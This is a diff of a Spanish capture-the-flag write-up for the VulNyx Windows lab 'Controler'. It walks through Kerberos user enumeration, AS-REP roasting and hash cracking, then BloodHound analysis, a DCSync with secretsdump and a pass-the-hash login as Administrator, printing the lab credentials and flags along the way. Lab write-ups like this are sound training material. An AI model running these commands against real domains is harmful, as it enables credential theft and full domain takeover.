@@ -2,13 +2,15 @@ ___
 Tags: #kerbrute #hashcat #crackmapexec #bloodhound #evil-winrm #secretsdump
 ___
 # Controler
+
 ## Información General
 
-**- Dificultad:** Medium
-**- Sistema operativo:** Windows
-**- Vulnerabilidad explotada.**  Missconfiguration
-**- Fecha de resolución:** 06/05/2026
-**- Enlace:** [Controler](https://vulnyx.com/machines/)
+**- Dificultad:** Medium <br>
+**- Sistema operativo:** Windows <br>
+**- Vulnerabilidad explotada.**  Missconfiguration <br>
+**- Fecha de resolución:** 06/05/2026 <br>
+**- Enlace:** [Controler](https://vulnyx.com/machines/) <br>
+
 ## Reconocimiento
 
 **Plataforma** nos proporciona la ip de la máquina objetivo **ip_objetivo**
@@ -19,7 +21,10 @@ ___
 sudo arp-scan -I eth0 --localnet --ignoredups
 ```
 
-![[Preparación de eCPPTv3/Machine/VulNyx/controler/images/arpscan.png]]
+<p align="center"> 
+<img src="images/arpscan.png" width="600" alt="Resultado de Nmap">
+</p>
+
 ### Ping
 
 Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:
@@ -29,7 +34,9 @@ ping -c 1 192.168.0.109
 ```
 
 **Su ttl es 128. Por tanto, es Window**
+
 ## Enumeración
+
 ### Escaneo de puertos abiertos
 
 #### Escaneo de puerto TCP
@@ -83,7 +90,9 @@ Luego, usamos la herramienta
 ./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.0.109 A-Z.Surnames.txt
 ```
 
-![[usuario obtenido.png]]
+<p align="center"> 
+<img src="images/usuario obtenido.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Luego para conseguir la contraseña tenemos tres caminos de ataque: 
 
@@ -99,7 +108,9 @@ El usuario recien obtenido lo guaradaremos en un .txt  y el comando quedaría as
 impacket-GetNPUsers 'control.nyx/' -no-pass -usersfile user.txt -dc-ip 192.168.0.109
 ```
 
-![[hashkerboreasting.png]]
+<p align="center"> 
+<img src="images/hashkerboreasting.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Para saber la contraseña del usuario usaremos hashcat en concreto el modulo 18200 y guardaremos el hash del usuario en un .txt
 
@@ -113,7 +124,9 @@ La contraseña es **101Music**. Por tanto, las credenciales quedarían --> **B.L
 crackmapexec smb 192.168.0.109 -u 'B.LEWIS' -p '101Music'   
 ```
 
-![[usuario valido.png]]
+<p align="center"> 
+<img src="images/usuario valido.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 crackmapexec smb 192.168.0.109 -u 'B.LEWIS' -p '101Music' --users
@@ -121,7 +134,9 @@ crackmapexec smb 192.168.0.109 -u 'B.LEWIS' -p '101Music' --users
 
 Con el parámetro **--users** me hará un listado de usuarios del dominio 
 
-![[lista de usuauriop.png]]
+<p align="center"> 
+<img src="images/lista de usuauriop.png" width="600" alt="Resultado de Nmap">
+</p>
 
 En concreto, el usuario **j.levy** está habilitado, podríamos descubrirlo por fuerza bruta
 
@@ -135,7 +150,9 @@ Tardará bastante en dar la contraseña pero es **Password1**
 crackmapexec smb 192.168.0.109 -u 'j.levy' -p 'Password1'   
 ```
 
-![[controler jlwvy.png]]
+<p align="center"> 
+<img src="images/controler jlwvy.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Investigando con la herramienta **ldapdomaindump** descubro que el usuario j.levy esta en el grupo de evil-winrm, por eso este usuario si puedes logearse y el otro no.
 
@@ -143,9 +160,12 @@ Investigando con la herramienta **ldapdomaindump** descubro que el usuario j.lev
 evil-winrm -i 192.168.0.109 -u 'j.levy' -p 'Password1'
 ```
 
-![[primer flag.png]]
+<p align="center"> 
+<img src="images/primer flag.png" width="600" alt="Resultado de Nmap">
+</p>
 
 flag usuario: **587c4dac7a29c5c2a2d98732116e5bee**
+
 ## Post explotación
 
 ### Bloodhound
@@ -156,7 +176,9 @@ Con el comando siguiente obtenemos un .zip que contiene información de todo **A
 bloodhound-python -d 'control.nyx' -u 'b.lewis' -p '101Music' -gc 'CONTROLER.control.nyx' -dc 'CONTROLER.control.nyx' -ns 192.168.0.109 -c all --zip
 ```
 
-![[zip bloodhound.png]]
+<p align="center"> 
+<img src="images/zip bloodhound.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Este zip lo usaremos en la siguiente herramienta llamada **bloodhound** para instalarlo usaremos el siguiente comando, debemos de tener instalado previamente docker
 
@@ -168,7 +190,9 @@ curl -L https://ghst.ly/getbhce | sudo docker-compose -f - up
 
 Nos saldrá la contraseña de bloodhound, recuerda que el usuario siempre sera **admin**
 
-![[pass bloodhound.png]]
+<p align="center"> 
+<img src="images/pass bloodhound.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Para acceder al paner de bloodhound, nos iremos a nuestro navegador y pondremos lo siguiente:
 
@@ -178,21 +202,29 @@ http://localhost:8080
 
 Ingresamos las credenciales, aveces te pedirá resetear la contraseña, en mi caso no lo me lo ha pedido.
 
-![[panel bloohound.png]]
+<p align="center"> 
+<img src="images/panel bloohound.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El .zip que hemos obtenido anteriormente lo subiremos donde pone **quick upload**, nos esperamos unos segundos y para saber si se ha cargado correctamente, lo que haremos es irnos a **explore - search** y porbamos buscar unos de los usuarios que tenemos credenciales, por ejemplo **j.levy**
 
-![[bloodhound jlevy.png]]
+<p align="center"> 
+<img src="images/bloodhound jlevy.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Si clicamos en el usuario nos saldrá un panel y nos iremos a **Outbound Object Control** y nos aparecerá lo siguiente:
 
-![[jlevy controlnyx.png]]
+<p align="center"> 
+<img src="images/jlevy controlnyx.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Que un usuario de bajos privilegios tenga el permiso **AllExtendedRights** sobre el dominio **Control.NYX** es como si fuera administrador sin serlo. Para explotarlo clicamos encima del permiso, y le damos a **Linux Abuse**
 
 El permiso **AllExtendedRights** de un usuario sobre el objeto del **Dominio** es, esencialmente, una llave maestra para convertirte en Administrador del Dominio
 
-![[abuse linux.png]]
+<p align="center"> 
+<img src="images/abuse linux.png" width="600" alt="Resultado de Nmap">
+</p>
 
 comprobamos que con el siguiente comando podemos explotar el dominio
 
@@ -206,7 +238,9 @@ Adaptando el comando con los datos que hemos recopilado
 impacket-secretsdump control.nyx/j.levy:Password1@CONTROLER.control.nyx
 ```
 
-![[hash usuario.png]]
+<p align="center"> 
+<img src="images/hash usuario.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Credenciales --> **Administrator**:**48b20d4f3ea31b7234c92b71c90fbff7**
 
@@ -214,9 +248,12 @@ Credenciales --> **Administrator**:**48b20d4f3ea31b7234c92b71c90fbff7**
 evil-winrm -i 192.168.0.109 -u 'Administrator' -H '48b20d4f3ea31b7234c92b71c90fbff7'
 ```
 
-![[Preparación de eCPPTv3/Machine/VulNyx/controler/images/root.png]]
+<p align="center"> 
+<img src="images/root.png" width="600" alt="Resultado de Nmap">
+</p>
 
 flag de root: **b43e4c1b7df273b73966bc038774bafd**
+
 ## Conclusión
 
 Esta maquina controler de la plataforma de **Vulnyx** es increible, con lo que aprendes es una locura. totalmente recomendada.
